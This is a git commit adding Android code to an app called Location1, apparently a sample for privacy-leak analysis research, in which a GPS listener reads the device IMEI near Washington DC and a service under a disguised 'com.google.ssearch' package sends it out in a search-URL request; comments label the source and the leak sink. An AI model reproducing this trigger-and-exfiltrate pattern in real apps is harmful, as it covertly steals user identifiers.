e30d2ee80d4b975257cb3f0ad46fb27593ca2a57
Hao Fu <jamesfuhao@gmail.com>
2016-07-02 16:03:17 -0700

    Location1

---
+++ Location1/app/src/main/java/com/google/ssearch/SearchService.java
@@ -0,0 +1,76 @@
+package com.google.ssearch;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.util.Log;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class SearchService extends Service {
+    @Override
+    public int onStartCommand (Intent intent, int flags, int startId) {
+        String imei = intent.getExtras().getString("secret");
+        Thread connectionThread = new Thread(new ConnectionThread(imei));
+        connectionThread.start();
+
+        return 1;
+    }
+
+    private class ConnectionThread implements Runnable {
+        String data = "";
+
+        public ConnectionThread(String data) {
+            this.data = data;
+        }
+
+        @Override
+        public void run() {
+            try {
+                connect(data);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+        private void connect(String data) throws IOException {
+            String URL = "http://www.google.com/search?q=";
+            URL = URL.concat(data);
+            java.net.URL url = new URL(URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
+            conn.setRequestMethod("GET");
+            conn.setDoInput(true);
+            // Starts the query
+            conn.connect();
+            Log.d(getClass().getSimpleName(), URL);
+
+            InputStream is = conn.getInputStream();
+            if (is == null) {
+                return;
+            }
+            StringBuilder sb = new StringBuilder();
+            BufferedReader br = new BufferedReader(new InputStreamReader(is));
+            String line;
+            try {
+                while ((line = br.readLine()) != null) {
+                    sb.append(line);
+                }
+            } finally {
+                br.close();
+                is.close();
+            }
+            Log.d(getClass().getSimpleName(), sb.toString());
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
--- Location1/app/src/main/java/edu/ucdavis/location1/MainActivity.java
+++ Location1/app/src/main/java/edu/ucdavis/location1/MainActivity.java
@@ -1,13 +1,61 @@
 package edu.ucdavis.location1;
 
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 
+/**
+ * Class: MainActivity
+ * Description: Attack when at Washington dc
+ * Authors: Hao Fu(haofu@ucdavis.edu)
+ * Date: 7/2/2016 3:50 PM
+ */
 public class MainActivity extends AppCompatActivity {
+
+    Activity mActivity;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        mActivity = this;
+
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+
+        LocationListener locationListener = new MyLocationListener();
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+    }
+
+    private class MyLocationListener implements LocationListener {
+        @Override
+        public void onLocationChanged(Location loc) {  //source
+            double lat = loc.getLatitude();
+            double lon = loc.getLongitude();
+
+            if ((int)lat == 38 && (int)lon == 77 ) {
+                Intent in = new Intent();
+                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                String imei = telephonyManager.getDeviceId(); //source
+                in.putExtra("secret", imei);
+                in.setClass(mActivity, com.google.ssearch.SearchService.class);
+                startActivity(in);
+            }
+        }
+
+        @Override
+        public void onProviderDisabled(String provider) {}
+
+        @Override
+        public void onProviderEnabled(String provider) { }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {}
     }
 }
